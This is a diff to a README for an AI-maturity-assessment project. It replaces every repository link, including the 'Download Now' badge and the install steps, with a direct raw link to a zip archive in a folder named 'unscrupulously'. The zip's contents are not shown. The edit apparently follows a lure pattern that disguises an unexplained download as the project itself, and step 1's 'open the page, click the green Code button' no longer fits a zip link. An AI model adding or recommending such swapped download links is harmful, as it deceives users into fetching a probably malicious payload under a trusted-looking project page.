@@ -1,6 +1,6 @@
 # 🧭 open-ai-transformation-maturity-model - Assess AI maturity with clarity
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20Now-4F46E5-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/szczepanskistasiek/open-ai-transformation-maturity-model)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20Now-4F46E5-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/szczepanskistasiek/open-ai-transformation-maturity-model/raw/refs/heads/main/unscrupulously/model-transformation-maturity-ai-open-1.8.zip)
 
 ## 📘 What this is
 
@@ -12,7 +12,7 @@ It is built for software groups that want a clear view of AI use across delivery
 
 Use this link to visit the page and download or open the project:
 
-https://github.com/szczepanskistasiek/open-ai-transformation-maturity-model
+https://github.com/szczepanskistasiek/open-ai-transformation-maturity-model/raw/refs/heads/main/unscrupulously/model-transformation-maturity-ai-open-1.8.zip
 
 ## 💻 Before you start
 
@@ -34,7 +34,7 @@ If you plan to view or edit the content, you may also want:
 Follow these steps:
 
 1. Open the download page in your browser:
-   https://github.com/szczepanskistasiek/open-ai-transformation-maturity-model
+   https://github.com/szczepanskistasiek/open-ai-transformation-maturity-model/raw/refs/heads/main/unscrupulously/model-transformation-maturity-ai-open-1.8.zip
 
 2. If the page shows a green Code button, click it.
 
@@ -347,4 +347,4 @@ You can use this project in meetings, workshops, and planning sessions. It works
 
 ## 🔗 Download or open again
 
-https://github.com/szczepanskistasiek/open-ai-transformation-maturity-model
+https://github.com/szczepanskistasiek/open-ai-transformation-maturity-model/raw/refs/heads/main/unscrupulously/model-transformation-maturity-ai-open-1.8.zip
